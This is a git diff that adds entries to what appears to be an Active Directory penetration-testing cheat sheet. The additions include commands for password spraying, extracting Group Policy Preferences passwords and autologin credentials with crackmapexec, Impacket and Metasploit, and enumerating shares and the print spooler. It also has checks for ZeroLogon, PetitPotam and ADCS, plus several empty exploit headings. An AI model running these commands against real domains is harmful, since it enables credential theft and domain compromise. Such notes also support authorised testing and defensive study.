@@ -10,12 +10,67 @@ Using crackmapexec to test for password equal to username on domain contoso.com
 for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
 ```
 
+### Checking NLA
+
 # Authenticated enumeration
 
+
+### Active Directory user description
+Using crackmapexec to get active directory user description
+```
+crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M get-desc-users
+```
+
+### Resetting expired passwords remotely
+- https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/
+
+### Machine Account Quota
+```
+crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -d gnb.ca -M MAQ
+```
+
 ### Checking GPP passwords
+- https://pentestlab.blog/tag/gpp/
+Using crackmapexec GPP module
 ```
 crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
 ```
+
+Using Impackets Get-GPPPassword.py
+```
+python3 Get-GPPPassword.py company.com/jdoe:Pass1234@10.10.0.10
+```
+
+Using Metasploit module 
+```
+use auxiliary/scanner/smb/smb_enum_gpp
+msf auxiliary(smb_enum_gpp) > set rhosts 192.168.0.10
+msf auxiliary(smb_enum_gpp) > set smbuser jdoe
+msf auxiliary(smb_enum_gpp) > set smbpass Pass1234
+msf auxiliary(smb_enum_gpp) > exploit
+```
+
+### Checking GPP autologin
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_autologin
+```
+
+### Checking share
+Checking share access rights with domain user
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com --shares
+```
+
+### Print spooler service
+Checking if print spooler service is enable using impacket RPCDUMP or crackmapexec (used RPCDUMP but can be used to scan on large range)
+```
+python3 rpcdump.py company.com/jdoe:Pass1234@10.10.0.10 | grep 'MS-RPRN\|MS-PAR'
+crackmapexec smb rangeIP.txt -u jdoe -p Pass1234 -d company.com -M spooler | grep Spooler
+```
+
+
+
+
 
 ### Expanding BloodHound
 - https://github.com/hausec/Bloodhound-Custom-Queries
@@ -26,7 +81,41 @@ crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
 
 # Exploitation
 
+### Exploiting GPO
+- https://github.com/Group3r/Group3rhttps://github.com/Group3r/Group3r
+
+### PAC
+Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
+
+### ProxyLogon
+
+### ProxyShell
+
+### ZeroLogon
+
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M zerologon
+```
+
+### PrintNightmare
+
+### Petitpotam
+
+Check to validate host is vulnerable to petitpotam
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
+```
+### samAccountName spoofing
+
 # Active Directory exploitation
+
+---> CHECKER RAPPORT Vulns pentest interne (privileged groups, machineAccountQuota, publication Linkedin groupe membership tenable)
+
+### Exploiting ADCS
+Find PKI Enrollment Services in Active Directory and Certificate Templates Names
+```
+crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M adcs
+```
 
 # Persistence
 
